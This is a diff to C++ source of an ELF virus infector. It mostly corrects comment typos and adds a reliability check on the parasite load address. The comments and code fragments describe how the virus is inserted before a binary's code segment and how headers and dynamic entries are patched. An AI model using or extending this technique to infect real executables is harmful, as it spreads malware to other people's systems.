@@ -34,21 +34,21 @@ bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
 
 // On some arch, the CODE segment would map from the start of the elf (aarch64)
 // which results in less LOAD entries. But some would have multiple LOAD entries
-// precedding CODE, and only map what's necessary to have execution bit (x86).
+// preceding CODE, and only map what's necessary to have execution bit (x86).
 // for example:
 //    Type Offset   VirtAddr            FileSiz           Flg
 //    LOAD 0x000000 0x0000000000400000  0x002518  R   0x1000
 //    LOAD 0x003000 0x0000000000403000  0x0573f1  RE  0x1000 <-- CODE
 //    LOAD 0x05b000 0x000000000045b000  0x0844d0  R   0x1000
 //    LOAD 0x0dfb00 0x00000000004e0b00  0x002550  RW  0x1000
-// Since we must insert virus to the begining of CODE, the virus insertion
+// Since we must insert virus to the beginning of CODE, the virus insertion
 // offset is the original CODE start offset, and all phdr entry offsets after
 // CODE will be shifted back. All entries before and including CODE must shift
 // vaddr forward.
 //
 //    LOAD 0x000000 0x0000000000400000  0x0d2910  RE  0x10000 <-- CODE
 //    LOAD 0x0d2910 0x00000000004e2910  0x002d18  RW  0x10000
-// In this example, the CODE starts from the begining, including the ehdr and
+// In this example, the CODE starts from the beginning, including the ehdr and
 // phdr We need to leave elf header intact and therefore, the virus must be
 // inserted after ehdr but before the phdr, and all phdr entry offsets after
 // CODE will be shifted back.
@@ -116,10 +116,10 @@ bool does_entry_contain_address(Elf64_Xword tag) {
 // The dynamic section is generated if the host participates in dynamic linking
 // and it includes various information to support it. For example, the
 // DT_GNU_HASH entry for fast symbol lookup, which points to the starting vaddr
-// of the .gnu.hash section, if moved forwarded to accomadate our virus, must be
-// patched accordingly. This function searches through all entries in .dynamic
-// section and shift those pointers forward if they have a smaller vaddr than
-// the firs byte of CODE (where we insert the virus).
+// of the .gnu.hash section, if moved forwarded to accommodate our virus, must
+// be patched accordingly. This function searches through all entries in
+// .dynamic section and shift those pointers forward if they have a smaller
+// vaddr than the firs byte of CODE (where we insert the virus).
 bool patch_dyamic(std::span<std::byte> host_mapping, const Elf64_Ehdr& ehdr,
                   const Elf64_Shdr& shdr,
                   Elf64_Off original_code_segment_file_offset,
@@ -178,7 +178,7 @@ size_t inject_virus(std::span<std::byte> host_mapping,
     // start at a page aligned address.
     real_virus_start_offset = extra;
   } else {
-    // This happens when we have a non-CODE segment precedding CODE segment. Our
+    // This happens when we have a non-CODE segment preceding CODE segment. Our
     // virus code is always page aligned.
     padded_virus_insert_offset = original_code_segment_file_offset;
     real_virus_start_offset = padded_virus_insert_offset;
@@ -283,8 +283,15 @@ bool ReverseTextInfector::analyze(std::span<const std::byte> host_mapping,
 
       parasite_load_address_ =
           original_code_segment_p_vaddr_ - padded_virus_size_;
+
+      if (parasite_load_address_ < 0x8000) {
+        // most system's mmap_min_addr is 32768. A more reliable way is to read
+        // procfs.
+        return false;
+      }
+
       if (original_code_segment_file_offset_ == 0) {
-        // Because we need to accomodate the elf header, the virus has padding
+        // Because we need to accommodate the elf header, the virus has padding
         // before it. The real entry is one page after the originally planned
         // vaddr in order to make the virus page aligned and rodata relocation
         // safe.
